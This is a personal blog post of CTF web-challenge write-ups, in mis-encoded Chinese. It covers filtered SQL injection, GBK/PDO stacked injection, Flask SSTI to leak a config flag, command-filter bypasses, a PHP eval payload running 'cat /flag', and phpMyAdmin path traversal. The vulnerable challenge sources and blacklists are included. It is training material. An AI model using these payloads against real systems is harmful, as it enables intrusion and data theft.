<!DOCTYPE html>
<html>
  <!-- Html Head Tag-->
  <head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content>
  <meta name="author" content="disshu">
  <!-- Open Graph Data -->
  <meta property="og:title" content="CTFè®­ç»ƒ(part II)">
  <meta property="og:description" content>
  <meta property="og:site_name" content="disshu">
  <meta property="og:type" content="article">
  <meta property="og:image" content="http://yoursite.com">
  
    <link rel="alternate" href="/atom.xml" title="disshu" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  

  <!-- Site Title -->
  <title>disshu</title>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="/disshu.github.io/css/bootstrap.min.css">
  <!-- Custom CSS -->
  
  <link rel="stylesheet" href="/disshu.github.io/css/style.dark.css">

  <!-- Google Analytics -->
  

</head>

  <body>
    <!-- Page Header -->


<header class="site-header header-background" style="background-image: url(/disshu.github.io//img/cumt.png)">
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="page-title with-background-image">
          <p class="title">CTFè®­ç»ƒ(part II)</p>
          <p class="subtitle"></p>
        </div>
        <div class="site-menu with-background-image">
          <ul>
            
              <li>
                <a href="/disshu.github.io/">
                  
                  Home
                  
                </a>
              </li>
            
              <li>
                <a href="/disshu.github.io/archives">
                  
                  Archives
                  
                </a>
              </li>
            
              <li>
                <a href="https://github.com/disshu">
                  
                  Github
                  
                </a>
              </li>
            
              <li>
                <a href="mailto:15695257867@163.com">
                  
                  Email
                  
                </a>
              </li>
            
          </ul>
        </div>
      </div>
    </div>
  </div>
</header>

<article>
  <div class="container typo">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="post-info text-muted">
          
            <!-- Author -->
            <span class="author info">By disshu</span>
          
          <!-- Date -->
          <span class="date-time info">On
            <span class="date">2020-02-20</span>
            <span class="time">09:50:05</span>
          </span>
          
        </div>
        <!-- Tags -->
        
        <!-- Post Main Content -->
        <div class="post-content">
          <p>ç¬¬äºŒé˜¶æ®µå‡ºå‡»</p>
<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>ç¼–ç é—®é¢˜,è¿™é¢˜è¦æ±‚ä½ è´­ä¹°äº§å“,ä½†æ˜¯æ€»æ˜¯å‡ºç°å¦‚ä¸‹æç¤º,è¦æ±‚åªå¡«å…¥ä¸€ä¸ªchar<br><img src="https://img-blog.csdnimg.cn/20200220185728972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†å³å‡»æºä»£ç å‘ç°hint utf-8å¾ˆé‡è¦,æ‰€ä»¥æˆ‘ä»¬å°±æ‰¾&gt;10000çš„unicodeç <br><a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">https://www.compart.com/en/unicode/</a><br>åœ¨è¿™ä¸ªæ¨¡å—ä¸‹<br><img src="https://img-blog.csdnimg.cn/20200220185935950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»other number,æŸ¥è¯¢å³å¯<br>ç„¶åæŸ¥æ‰¾ä»–çš„UTF-8 Encoding:<br>å°†0xæ”¹ä¸º%,å¡«å…¥é¢˜ä¸­å³å¯</p>
<h1 id="ä»SWPU2019-WEB1å­¦sqlæ³¨å…¥"><a href="#ä»SWPU2019-WEB1å­¦sqlæ³¨å…¥" class="headerlink" title="ä»SWPU2019-WEB1å­¦sqlæ³¨å…¥"></a>ä»SWPU2019-WEB1å­¦sqlæ³¨å…¥</h1><p>è¿™é“é¢˜å°†æ³¨é‡Šç¬¦è¿‡æ»¤äº†,æ‰€ä»¥å¯ä»¥åœ¨æœ€åçš„å­—æ®µæ•°é—­åˆ,è€Œä¸”ä»–å°†order byè¿‡æ»¤<br>åªèƒ½æ„é€ å¦‚ä¸‹å­—å¥<br><code>-1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code><br>å‘ç°æœ‰22ä¸ª å¤´ç–¼<br>å‘ç°2å’Œ3å›æ˜¾<br>é¦–å…ˆè¦æŸ¥æ˜¯å“ªä¸ªæ˜¯æ•°æ®åº“<br><code>-1&#39;union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code><br>mysqlå› ä¸ºè¿™é¢˜è¿‡æ»¤äº†information_schema,å¯ä»¥ä½¿ç”¨ys.schema_table_statistics_with_buffer<br>è¿™é¢˜è¿˜æ˜¯maridb,æŸ¥äº†å®˜æ–¹æ–‡æ¡£,å¦‚ä¸‹èƒ½æŸ¥è¡¨å</p>
<pre><code class="hljs undefined"><span class="hljs-number">-1</span>'union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>mysql.innodb_table_stats),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,'<span class="hljs-number">22</span></code></pre>

<p>æ¥ä¸‹æ¥ä»‹ç»ä¸€ä¸ªæ— åˆ—åæ³¨å…¥<br> <code>select</code>4<code>from (select 1,2,3,4,5,6 union select * from users)a;</code><br> ä¼šæŠŠç¬¬å››åˆ—çš„æ•°æ®æ‹¿å‡ºæ¥,ä½†æ˜¯è¿™é¢˜ä¸­çš„åå¼•å·è¿‡æ»¤äº†<br>ç”¨ä¸‹åˆ—æ–¹æ³•<br><code>select b from (select 1,2,3 as b,4,5 union select * from users)a;</code><br>ä½†æˆ‘ä»¬ä¸çŸ¥é“æ˜¯ç¬¬å››åˆ—æ‰€ä»¥è¦æå‰fuzzingä¸€ä¸‹<br><code>select b from (select 1,2 as b,3,4,5 union select * from users)a;</code><br>æŸ¥ç¬¬ä¸‰å­—æ®µ,æœ€åfuzzingåˆ°3çš„æ—¶å€™æŸ¥åˆ°flag</p>
<h1 id="gbk-pdd-sqlæ³¨å…¥"><a href="#gbk-pdd-sqlæ³¨å…¥" class="headerlink" title="gbk+pdd sqlæ³¨å…¥"></a>gbk+pdd sqlæ³¨å…¥</h1><p>PDOé»˜è®¤æ˜¯å…è®¸å¤šå¥æ‰§è¡Œå’Œæ¨¡æ‹Ÿé¢„ç¼–è¯‘çš„,åœ¨å‚æ•°å¯æ§çš„æƒ…å†µä¸‹, ä¼šå¯¼è‡´å †å æ³¨å…¥ã€‚<br>åœ¨é¢„ç¼–è¯‘çš„æƒ…å†µä¸‹,å•å¼•å·å’Œä¸€äº›æ•æ„Ÿå­—ç¬¦ä¼šè¢«è½¬ä¹‰,æˆ‘ä»¬çŸ¥é“åœ¨gbkç¼–ç ä¸‹é€šè¿‡%dfå¯ä»¥ç»•è¿‡è½¬ä¹‰<br>pddåŸç†æ‰§è¡Œç¼–è¯‘<br>Set @x=0x31<br>Prepare a from â€œ select balabala from table1 where 1=? â€<br>Execute a using @x<br>å¦‚ä¸‹é¢˜</p>
<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span> 
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span><span class="hljs-params">($str)</span>
    </span>&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span>,$str,$matches))
        &#123;
            print_r($matches);
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
        &#125;
        <span class="hljs-keyword">else</span>
        &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
        &#125;
    &#125;
    <span class="hljs-keyword">try</span>
    &#123;
        $db = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">'mysql:host=localhost;dbname=pdotest'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'******'</span>);
    &#125; 
    <span class="hljs-keyword">catch</span>(<span class="hljs-keyword">Exception</span> $e)
    &#123;
        <span class="hljs-keyword">echo</span> $e-&gt;getMessage();
    &#125;
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'id'</span>]))
    &#123;
        $id = $_GET[<span class="hljs-string">'id'</span>];
    &#125;
    <span class="hljs-keyword">else</span>
    &#123;
        $test = $db-&gt;query(<span class="hljs-string">"select balabala from table1"</span>);
        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);
        $id = $res[<span class="hljs-string">'balabala'</span>];
    &#125;
    <span class="hljs-keyword">if</span>(check($id))
    &#123;
        $query = <span class="hljs-string">"select balabala from table1 where 1=?"</span>;
        $db-&gt;query(<span class="hljs-string">"set names gbk"</span>);
        $row = $db-&gt;prepare($query);
        $row-&gt;bindParam(<span class="hljs-number">1</span>,$id);
        $row-&gt;execute();
    &#125;</span></code></pre>

<p>æºç ä¸­å†™äº†å¤šä¸ªå…³é”®å­—è¢«è¿‡æ»¤,åŠæ³•ä¹‹ä¸€å°±æ˜¯å…¨ç”¨charä»£æ›¿</p>
<pre><code class="hljs undefined">pdo = <span class="hljs-string">"set @a=concat(&#123;&#125;);PREPARE charinject FROM @a;EXECUTE charinject;"</span>.format(charinject)
		pdo += '||&#123;&#125;<span class="hljs-symbol">%271</span>&#123;&#125;<span class="hljs-symbol">%27</span>=&#123;&#125;<span class="hljs-symbol">%271</span>'.format(<span class="hljs-string">"%df"</span>,<span class="hljs-string">"%df"</span>,<span class="hljs-string">"%df"</span>)
		url = 'http://<span class="hljs-number">6627</span>a<span class="hljs-number">3</span>ecadb<span class="hljs-number">74</span>fc<span class="hljs-number">8</span>a<span class="hljs-number">015</span><span class="hljs-keyword">c</span><span class="hljs-number">12</span>efa<span class="hljs-number">10641461</span>b<span class="hljs-number">80</span>f<span class="hljs-number">02696</span><span class="hljs-keyword">c</span><span class="hljs-number">4583</span>.changame.ichunqiu.com/?id=<span class="hljs-number">1</span><span class="hljs-symbol">%df</span><span class="hljs-symbol">%27</span><span class="hljs-comment">;&#123;&#125;'.format(pdo)</span></code></pre>

<h1 id="WesternCTF2018-shrine-1"><a href="#WesternCTF2018-shrine-1" class="headerlink" title="[WesternCTF2018]shrine 1"></a>[WesternCTF2018]shrine 1</h1><p>æºç å¦‚ä¸‹</p>
<pre><code class="hljs undefined"><span class="hljs-keyword">import</span> flask
<span class="hljs-keyword">import</span> os

app = flask.Flask(__name__)

app.config[<span class="hljs-string">'FLAG'</span>] = os.environ.pop(<span class="hljs-string">'FLAG'</span>)

<span class="hljs-meta">@app.route('/')</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">return</span> open(__file__).read()

<span class="hljs-meta">@app.route('/shrine/&lt;path:shrine&gt;')</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shrine</span><span class="hljs-params">(shrine)</span>:</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">safe_jinja</span><span class="hljs-params">(s)</span>:</span>
        s = s.replace(<span class="hljs-string">'('</span>, <span class="hljs-string">''</span>).replace(<span class="hljs-string">')'</span>, <span class="hljs-string">''</span>)
        blacklist = [<span class="hljs-string">'config'</span>, <span class="hljs-string">'self'</span>]
        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) 
        + s

    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(debug=<span class="hljs-literal">True</span>)

é¦–å…ˆåœ¨shrineè·¯å¾„ä¸‹æµ‹è¯•sstièƒ½æ­£å¸¸æ‰§è¡Œ

/shrine/&#123;&#123; <span class="hljs-number">4</span>*<span class="hljs-number">4</span> &#125;&#125;</code></pre>

<p>æœç„¶æœ‰,ä½†æ˜¯è¿™è·Ÿä¹‹å‰çš„å®‰æ’æœˆèµ›çš„ä¸€é“é¢˜ä¸åŒ,è¿™ä¸ªæ˜¯flagå­˜åœ¨å˜é‡,è€Œä¸æ˜¯æ‰§è¡Œå‘½ä»¤<br><code>app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)</code><br>å¯ä»¥çœ‹å‡ºflagå­˜åœ¨appçš„å˜é‡configä¸­çš„,æœ¬æ¥ç›´æ¥å°±å¯ä»¥æŸ¥çœ‹,ä½†æ˜¯é»‘åå•è¿‡æ»¤äº†<br>ä¸è¿‡pythonè¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°ï¼Œæ¯”å¦‚url_forå’Œget_flashed_messages<br>/shrine/<br>å¯ä»¥æŸ¥çœ‹åˆ°è¡¨ç¤ºå½“å‰appçš„å¦ä¸€ä¸ªè¯<br><img src="https://img-blog.csdnimg.cn/20200301191331235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="app"><br>å¯ä»¥é€šè¿‡æ•°ç»„è®¿é—®<br>url_for.<strong>globals</strong>[â€˜current_appâ€™].configæŸ¥çœ‹flag<br><img src="https://img-blog.csdnimg.cn/20200301191457118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="flag"></p>
<h1 id="buuctf-å®‰æ´µæ¯-2019-easy-web"><a href="#buuctf-å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="buuctf [å®‰æ´µæ¯ 2019]easy_web"></a>buuctf [å®‰æ´µæ¯ 2019]easy_web</h1><p>è¿›å»åå‘ç°imgå‚æ•° base64-&gt;base64-&gt;hexè§£ç  å‘ç°555.jpgå¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«<br>åŒæ ·æ–¹å¼è·å¾—index.phpæºç </p>
<pre><code class="hljs undefined"><span class="hljs-meta">&lt;?php</span>
error_reporting(E_ALL || ~ E_NOTICE);
header(<span class="hljs-string">'content-type:text/html;charset=utf-8'</span>);
$cmd = $_GET[<span class="hljs-string">'cmd'</span>];
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'img'</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>])) 
    header(<span class="hljs-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);
$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">'img'</span>])));

$file = preg_replace(<span class="hljs-string">"/[^a-zA-Z0-9.]+/"</span>, <span class="hljs-string">""</span>, $file);
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $file)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"xixiï½ no flag"</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
    $txt = base64_encode(file_get_contents($file));
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="hljs-string">"'&gt;&lt;/img&gt;"</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
&#125;
<span class="hljs-keyword">echo</span> $cmd;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"forbid ~"</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">if</span> ((string)$_POST[<span class="hljs-string">'a'</span>] !== (string)$_POST[<span class="hljs-string">'b'</span>] &amp;&amp; md5($_POST[<span class="hljs-string">'a'</span>]) === md5($_POST[<span class="hljs-string">'b'</span>])) &#123;
        <span class="hljs-keyword">echo</span> `$cmd`;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">echo</span> (<span class="hljs-string">"md5 is funny ~"</span>);
    &#125;
&#125;

<span class="hljs-meta">?&gt;</span>
&lt;html&gt;
&lt;style&gt;
  body&#123;
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:<span class="hljs-comment">#CCCCCC;</span>
&#125;
&lt;/style&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

<p>ç»•è¿‡æ­£åˆ™å‘ç°è¯»å–ä¿¡æ¯ç”¨çš„åŸºæœ¬éƒ½è¿‡æ»¤äº†<br>è¿™é‡Œä»‹ç»ä¸¤ç§æ–¹æ³•<br>sort /flag æˆ–è€…ca\t /flag<br>è¿™é‡Œäº§ç”Ÿäº†ç–‘é—®ä¸ºä»€ä¹ˆ \å’Œ\téƒ½è¿‡æ»¤äº† è¿˜èƒ½ä½¿ç”¨<br>å¯èƒ½ ca\tå­˜å…¥çš„æ—¶å€™æ˜¯ca<code>\\\\</code>tè¿™ä¹ˆå­˜å…¥çš„<br>æ‰€ä»¥å¯ä»¥æŸ¥çœ‹<br>md5 å®‰æ’æœˆèµ›è§è¿‡ å°±ä¸é˜è¿°äº†</p>
<h1 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h1><p>å…¶å®å‚æ•°ä¸­ä¹Ÿæ˜¯å¯ä»¥å†™phpä»£ç çš„ ğŸ˜­<br>ä»£ç å¦‚ä¸‹</p>
<pre><code class="hljs undefined"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span>
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'c'</span>]))&#123;
    show_source(<span class="hljs-keyword">__FILE__</span>);
&#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-comment">//ä¾‹å­ c=20-1</span>
    $content = $_GET[<span class="hljs-string">'c'</span>];
    <span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span>);
    &#125;
    $blacklist = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>];
    <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;
        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/'</span> . $blackitem . <span class="hljs-string">'/m'</span>, $content)) &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span>);
        &#125;
    &#125;
    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span>
    $whitelist = [<span class="hljs-string">'abs'</span>, <span class="hljs-string">'acos'</span>, <span class="hljs-string">'acosh'</span>, <span class="hljs-string">'asin'</span>, <span class="hljs-string">'asinh'</span>, <span class="hljs-string">'atan2'</span>, <span class="hljs-string">'atan'</span>, <span class="hljs-string">'atanh'</span>, <span class="hljs-string">'base_convert'</span>, <span class="hljs-string">'bindec'</span>, <span class="hljs-string">'ceil'</span>, <span class="hljs-string">'cos'</span>, <span class="hljs-string">'cosh'</span>, <span class="hljs-string">'decbin'</span>, <span class="hljs-string">'dechex'</span>, <span class="hljs-string">'decoct'</span>, <span class="hljs-string">'deg2rad'</span>, <span class="hljs-string">'exp'</span>, <span class="hljs-string">'expm1'</span>, <span class="hljs-string">'floor'</span>, <span class="hljs-string">'fmod'</span>, <span class="hljs-string">'getrandmax'</span>, <span class="hljs-string">'hexdec'</span>, <span class="hljs-string">'hypot'</span>, <span class="hljs-string">'is_finite'</span>, <span class="hljs-string">'is_infinite'</span>, <span class="hljs-string">'is_nan'</span>, <span class="hljs-string">'lcg_value'</span>, <span class="hljs-string">'log10'</span>, <span class="hljs-string">'log1p'</span>, <span class="hljs-string">'log'</span>, <span class="hljs-string">'max'</span>, <span class="hljs-string">'min'</span>, <span class="hljs-string">'mt_getrandmax'</span>, <span class="hljs-string">'mt_rand'</span>, <span class="hljs-string">'mt_srand'</span>, <span class="hljs-string">'octdec'</span>, <span class="hljs-string">'pi'</span>, <span class="hljs-string">'pow'</span>, <span class="hljs-string">'rad2deg'</span>, <span class="hljs-string">'rand'</span>, <span class="hljs-string">'round'</span>, <span class="hljs-string">'sin'</span>, <span class="hljs-string">'sinh'</span>, <span class="hljs-string">'sqrt'</span>, <span class="hljs-string">'srand'</span>, <span class="hljs-string">'tan'</span>, <span class="hljs-string">'tanh'</span>];
    preg_match_all(<span class="hljs-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  
    <span class="hljs-keyword">foreach</span> ($used_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> $func) &#123;
        <span class="hljs-keyword">if</span> (!in_array($func, $whitelist)) &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span>);
        &#125;
    &#125;
    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span>
    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.$content.<span class="hljs-string">';'</span>);
&#125;</code></pre>

<p>ä»£ç å°±æ˜¯cçš„å‚æ•°ä¸­è¦æœ‰ç™½åå•ä¸­çš„å‘½ä»¤,ä½†è¿™äº›éƒ½æ˜¯æ•°å­—å‡½æ•°<br>candir() å‡½æ•°ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br>base_convert() å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚<br>dechex() å‡½æ•°ï¼šæŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚<br>hex2bin() å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚<br>var_dump() ï¼šå‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚<br>readfile() å‡½æ•°ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚æ‚¨å¯ä»¥é€šè¿‡ @readfile() å½¢å¼è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ¥éšè—é”™è¯¯ä¿¡æ¯ã€‚<br>è¯­æ³•ï¼šreadfile(filename,include_path,context)<br>åŠ¨æ€å‡½æ•°<br>phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°ä¾‹å¦‚ï¼š$function = â€œsayHelloâ€;$function();<br>base_convert()æ˜¯å…³é”®<br><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat%20/flag</code></p>
<pre><code class="hljs undefined">base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) =&gt; <span class="hljs-string">"hex2bin"</span>
dechex(<span class="hljs-number">1598506324</span>) =&gt; <span class="hljs-string">"5f474554"</span>
<span class="hljs-meta"><span class="hljs-meta-keyword">$pi</span>=hex2bin("5f474554") =&gt; $pi="_GET"   //hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span>
(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-built-in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-built-in">abs</span>&#125;) =&gt; (<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built-in">pi</span>&#125;(<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built-in">abs</span>&#125;  <span class="hljs-comment">//&#123;&#125;å¯ä»¥ä»£æ›¿[]</span></code></pre>

<p>å……åˆ†åˆ©ç”¨äº†æ‰§è¡Œphpè¯­å¥<br>è¿‡æ»¤äº†[]åªèƒ½ç”¨{}</p>
<h1 id="gw-æ•°æ®åº“"><a href="#gw-æ•°æ®åº“" class="headerlink" title="gw æ•°æ®åº“"></a>gw æ•°æ®åº“</h1><p>phpadmin æ–‡ä»¶åŒ…å« 4.8ä»¥ä¸Šç‰ˆæœ¬<br><code>?target=db_datadict.php%253f/../../../../../../../../../Windows/DATE.ini</code></p>

        </div>
      </div>
    </div>
  </div>
</article>



    <!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <p class="copyright text-muted">
          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
        <p class="copyright text-muted">
          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
        </p>
      </div>
    </div>
  </div>
</footer>


    <!-- After Footer Scripts -->
<script src="/disshu.github.io/js/highlight.pack.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function(event) {
    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
    codeBlocks.forEach(function(block, index) {
      hljs.highlightBlock(block);
    });
  });
</script>

  </body>
</html>

